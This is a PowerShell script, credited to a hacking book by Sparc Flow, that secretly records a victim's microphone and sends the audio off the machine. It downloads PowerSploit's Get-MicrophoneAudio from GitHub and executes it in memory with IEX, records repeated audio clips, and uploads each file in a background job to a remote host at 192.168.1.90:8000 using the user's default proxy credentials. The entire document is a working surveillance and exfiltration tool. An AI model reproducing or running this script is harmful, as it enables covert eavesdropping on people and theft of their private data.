#
# Creates 10 minute long audio files and sends them to a remote location (192.168.1.90:8000 in this example)
#
# @uthor : Sparc Flow in "How to Hack a Fashion Brand"
# Credit Get-MicrophoneAudio by @sixdub of the PowerSploit framework
while($i -le 2)
{

$i++;
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials;
IEX($browser.DownloadString("https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Exfiltration/Get-MicrophoneAudio.ps1"));
write-host "starting recording $i"
Get-MicrophoneAudio -path .\file$i.wav -Length 10
write-host "sending job $i"
start-job -Name Para$i -ArgumentList $i -ScriptBlock{ $i = $args[0];$browser = New-Object System.Net.WebClient; $browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials; $browser.uploadFile("http://192.168.1.90:8000/", "c:\users\ejansen\appdata\local\file$i.wav");}

}
